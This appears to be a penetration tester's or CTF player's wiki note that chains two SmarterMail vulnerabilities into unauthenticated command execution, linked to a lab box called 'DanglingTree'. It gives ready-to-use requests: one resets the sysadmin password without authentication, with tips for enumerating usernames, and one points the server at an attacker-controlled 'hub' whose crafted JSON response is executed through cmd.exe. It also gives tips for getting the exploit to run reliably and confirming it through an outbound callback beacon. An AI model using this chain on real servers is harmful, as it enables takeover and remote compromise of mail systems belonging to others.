# SmarterMail: CVE-2026-23760 + CVE-2026-24423, a Real Pre-Auth Bypass → RCE Chain

Two real, independently patch-diffed SmarterMail (a third-party Windows
mail server product) vulnerabilities, both fixed in the same release
(**Build 9511**, Jan 15, 2026), that chain into unauthenticated OS command
execution as whatever Windows account SmarterMail's service runs as.
Fingerprint the version from the unauthenticated login page's inline JS
(`stProductVersion`/`stProductBuild`) before assuming either applies.

## CVE-2026-23760 — `force-reset-password` sysadmin auth bypass

Per [watchtowr Labs' decompiled-code
writeup](https://labs.watchtowr.com/attackers-with-decompilers-strike-again-smartertools-smartermail-wt-2026-0001-auth-bypass/)
(the deepest public technical source — full decompiled diff, not just an
advisory summary): `POST /api/v1/auth/force-reset-password` is
deliberately `[AllowAnonymous]` for the legitimate self-service reset
case. When the request body sets `"IsSysAdmin": true`, the vulnerable code
fetches the system administrator account and unconditionally overwrites
its password with the caller-supplied value — `OldPassword` is never
checked on that code path, no reset token either. The fix adds exactly one
validation call before the write.

The sysadmin *username* isn't necessarily `admin` — brute-force a small
candidate list (`admin`, `sysadmin`, `postmaster`, any service-account-
sounding name relevant to the target) through the same endpoint; every
non-existent username returns a distinct `USER_NOT_FOUND` from the one
that actually works.

```
POST /api/v1/auth/force-reset-password
{"IsSysAdmin":"true","Username":"<candidate>","OldPassword":"anything","NewPassword":"<new>","ConfirmPassword":"<new>"}
```

This only resets SmarterMail's **own internal** sysadmin credential store —
test but don't assume it doubles as the underlying OS/AD account's real
password; these are two separate credential stores even when the service
runs as a domain account.

## CVE-2026-24423 — `connect-to-hub` unauthenticated RCE

Per VulnCheck's advisory and a follow-up technical blog with the actual
decompiled flow: `POST /api/v1/settings/sysadmin/connect-to-hub` is also
`[AllowAnonymous]` and needs **no prior authentication at all**, unlike the
CVE above. It takes a `hubAddress`, POSTs to
`<hubAddress>/web/api/node-management/setup-initial-connection`, and
deserializes whatever JSON comes back **without validating it** — the
response's `SystemMount.CommandMount` field, if `SystemMount.Enabled` is
true, is shelled out directly (`cmd.exe /c <CommandMount>`, zero
sanitization).

```
POST /api/v1/settings/sysadmin/connect-to-hub
{"hubAddress":"http://<attacker>:<port>","oneTimePassword":"x","nodeName":"pwn"}
```

A fake "hub" HTTP server answers the resulting callback with the crafted
mount object:

```json
{
  "ClusterID": "<any GUID>", "SharedSecret": "any", "TargetHubs": {"a":"b"}, "IsStandby": false,
  "SystemMount": {"Enabled": true, "ReadOnly": false, "MountPath": "C:\\Windows\\Temp", "CommandMount": "<command>"},
  "SystemAdminUsernames": ["admin"]
}
```

## Practical gotchas (both real, both cost sessions to diagnose)

- **`MountPath` matters even though the command doesn't write there.** The
  Mount() logic creates a canary file/directory *inside* `MountPath` as a
  separate validation step from running `CommandMount`. If the canary
  write fails (root of `C:\`, a nonexistent path, anything the execution
  context can't write to), `CommandMount` may not run at all. Use an
  existing, writable directory (`C:\Windows\Temp`).
- **The call's own HTTP response is misleading, even on full success.**
  `connect-to-hub` always returns `HTTP 400 {"message":"Failed to mount
  system mount point"}` — that's a separate, later real-mount step failing
  (there's no actual network share), which happens *after*
  `CommandMount` already ran. Verify via an out-of-band beacon (a raw TCP
  callback carrying `whoami`/`hostname`), not the HTTP response.
- **File-write side effects are unreliable for verification** (a
  `whoami > file.txt` payload sometimes writes, sometimes silently
  doesn't) — prefer a network beacon over a filesystem check for
  confirming execution.

## Result

The Windows account SmarterMail's service actually runs as is not
guaranteed to be `NT AUTHORITY\SYSTEM` despite that being the generic
claim in some public writeups on this CVE class — confirm empirically
(`whoami` via the beacon) rather than assuming; a real deployment can have
the service running as a domain account instead, which is itself a
privilege escalation worth pursuing on its own (broader AD visibility,
different logon-session type, etc.) even if it isn't local admin.

## Seen on

- [[DanglingTree#Privesc|DanglingTree]] — chained both CVEs to escalate
  from `anderson.w` (WAC-RCE-only) to `danglingtree\svc_mail`, a genuine
  domain account whose broader LDAP visibility (living in `CN=Users`
  directly, unlike `anderson.w`'s deny-ACE-scoped OU) unblocked the rest
  of the engagement's AD enumeration.
